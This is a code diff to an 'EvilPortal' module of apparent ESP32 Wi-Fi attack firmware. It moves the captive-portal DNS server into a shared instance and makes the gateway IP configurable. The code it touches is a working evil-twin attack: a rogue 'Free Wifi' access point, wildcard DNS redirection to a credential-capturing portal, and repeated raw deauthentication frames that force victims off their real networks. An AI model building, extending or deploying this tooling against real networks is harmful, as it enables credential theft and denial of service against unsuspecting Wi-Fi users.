@@ -9,11 +9,17 @@
 #include "esp_wifi.h"
 #include "wifi_atks.h"
 
+static DNSServer &sharedEvilPortalDnsServer() {
+    static DNSServer server;
+    return server;
+}
+
 EvilPortal::EvilPortal(
     String tssid, uint8_t channel, bool deauth, bool verifyPwd, bool autoMode, bool backgroundMode
 )
     : apName(tssid), _channel(channel), _deauth(deauth), _verifyPwd(verifyPwd), _autoMode(autoMode),
       _backgroundMode(backgroundMode), webServer(80), _launchTime(millis()) {
+    dnsServer = &sharedEvilPortalDnsServer();
 
     _originalWifiMode = WiFi.getMode();
     _wifiWasConnected = (WiFi.status() == WL_CONNECTED);
@@ -53,7 +59,9 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
 }
 
 bool EvilPortal::setup() {
-    if (apGateway == IPAddress((uint32_t)0)) apGateway = IPAddress(192, 168, 4, 1);
+    if (apGateway == IPAddress((uint32_t)0)) {
+        if (!apGateway.fromString(bruceConfig.evilPortalGatewayIp)) apGateway = IPAddress(172, 0, 0, 1);
+    }
     if (apName.isEmpty()) apName = "Free Wifi";
 
     if (_autoMode) {
@@ -98,6 +106,10 @@ bool EvilPortal::setup() {
     }
 
     options = {
+        {"Default",
+         [this]() {
+             if (!apGateway.fromString(bruceConfig.evilPortalGatewayIp)) apGateway = IPAddress(172, 0, 0, 1);
+         }                                                                 },
         {"172.0.0.1",   [this]() { apGateway = IPAddress(172, 0, 0, 1); }  },
         {"192.168.4.1", [this]() { apGateway = IPAddress(192, 168, 4, 1); }},
     };
@@ -128,7 +140,7 @@ void EvilPortal::beginAP() {
     while (millis() - tmp < 3000) yield();
 
     setupRoutes();
-    dnsServer.start(53, "*", WiFi.softAPIP());
+    dnsServer->start(53, "*", WiFi.softAPIP());
     webServer.begin();
 }
 
@@ -244,7 +256,7 @@ void EvilPortal::setupRoutes() {
 
 void EvilPortal::restartWiFi(bool reset) {
     webServer.end();
-    dnsServer.stop();
+    dnsServer->stop();
     vTaskDelay(100 / portTICK_PERIOD_MS);
 
     _captiveHandler = nullptr;
@@ -254,7 +266,7 @@ void EvilPortal::restartWiFi(bool reset) {
     vTaskDelay(100 / portTICK_PERIOD_MS);
 
     setupRoutes();
-    dnsServer.start(53, "*", WiFi.softAPIP());
+    dnsServer->start(53, "*", WiFi.softAPIP());
     webServer.begin();
 
     if (reset) resetCapturedCredentials();
@@ -275,7 +287,7 @@ void EvilPortal::loop() {
             shouldRedraw = false;
         }
 
-        dnsServer.processNextRequest();
+        dnsServer->processNextRequest();
 
         if (!isDeauthHeld && (millis() - lastDeauthTime) > 250 && _deauth) {
             send_raw_frame(deauth_frame, 26);
@@ -319,7 +331,7 @@ void EvilPortal::loop() {
                 webServer.end();
                 vTaskDelay(200 / portTICK_PERIOD_MS);
 
-                dnsServer.stop();
+                dnsServer->stop();
                 vTaskDelay(100 / portTICK_PERIOD_MS);
 
                 WiFi.mode(_originalWifiMode);
@@ -342,7 +354,7 @@ void EvilPortal::loop() {
 
 void EvilPortal::processRequests() {
     if (!_backgroundMode) return;
-    dnsServer.processNextRequest();
+    dnsServer->processNextRequest();
     if (totalCapturedCredentials != (previousTotalCapturedCredentials + 1)) {
         previousTotalCapturedCredentials = totalCapturedCredentials - 1;
     }
